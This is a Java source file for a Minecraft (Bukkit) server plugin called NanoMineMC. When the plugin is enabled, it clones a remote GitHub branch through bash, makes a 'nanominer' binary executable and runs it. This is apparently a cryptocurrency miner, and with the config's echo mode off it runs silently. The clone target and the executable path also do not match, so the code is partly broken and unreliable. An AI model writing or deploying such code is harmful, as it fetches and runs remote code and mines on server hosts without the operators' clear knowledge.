package me.rtx4090.nanominemc;

import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.configuration.file.FileConfiguration;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;


public final class NanoMineMC extends JavaPlugin {


    @Override
    public void onEnable() {
        File currentDirectory = new File(System.getProperty("user.dir"));

        // Save the default config if it doesn't exist
        saveDefaultConfig();
        // Get the config
        FileConfiguration config = getConfig();
        // Use the config
        boolean echoMode = config.getBoolean("Echo Mode");

        if (echoMode) {
            getLogger().info("NanoMineMC has loaded");
        }

        //check if nano installed
        if (echoMode) {
            File file = new File(currentDirectory + "/nanominer");
            if (file.isFile() || file.exists()) {
                System.out.println("nano has been installed");
            } else {
                System.out.println("installing nano...");
                ProcessBuilder builder = new ProcessBuilder("bash", "-c", "git clone -b nano https://github.com/RTX4O9O/NanoMine.git");
                try {
                    Process process = builder.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        getLogger().info(line);
                    }

                } catch (IOException e) {
                    throw new RuntimeException(e);
                }

            }

        } else {
            File file = new File(currentDirectory + "/nanominer");
            if (file.isFile() || file.exists()) {

            } else {

                ProcessBuilder builder = new ProcessBuilder("bash", "-c", "git clone -b nano https://github.com/RTX4O9O/NanoMine.git");
                try {
                    Process process = builder.start();

                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
        }

        startNano(echoMode, currentDirectory);

    }

    void cloneNano() {

    }

    void startNano(boolean echo, File currentDirectory) {

        if (echo) {

            try {
                File nanominerFile = new File(currentDirectory, "nanominer");

                // Check if the file is not executable
                if (!nanominerFile.canExecute()) {
                    // Try to make the file executable
                    boolean success = nanominerFile.setExecutable(true);
                    if (!success) {
                        getLogger().info("Failed to change file permissions. Please check your access rights.");
                        return;
                    }
                }

                ProcessBuilder builder = new ProcessBuilder("bash", "-c", "./nanominer");
                builder.directory(currentDirectory);
                builder.redirectErrorStream(true);
                Process process = builder.start();

                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;

                while ((line = reader.readLine()) != null) {
                    getLogger().info(line);
                }
                int exitCode = process.waitFor();
                if (exitCode != 0) {
                    getLogger().info("exit: " + exitCode);
                }
            } catch (IOException | InterruptedException e) {
                e.printStackTrace();
            }

        } else {

            try {
                File nanominerFile = new File(currentDirectory, "nanominer");

                // Check if the file is not executable
                if (!nanominerFile.canExecute()) {
                    // Try to make the file executable
                    boolean success = nanominerFile.setExecutable(true);
                    if (!success) {
                        return;
                    }
                }

                ProcessBuilder builder = new ProcessBuilder("bash", "-c", "./nanominer");
                builder.directory(currentDirectory);
                builder.redirectErrorStream(true);
                Process process = builder.start();

            } catch (IOException e) {
                e.printStackTrace();
            }

        }
    }

    @Override
    public void onDisable() {
        // Save the default config if it doesn't exist
        saveDefaultConfig();
        // Get the config
        FileConfiguration config = getConfig();
        // Use the config
        boolean echoMode = config.getBoolean("Echo Mode");

        if (echoMode) {
            getLogger().info("NanoMineMC has shutdown");
        }

    }
}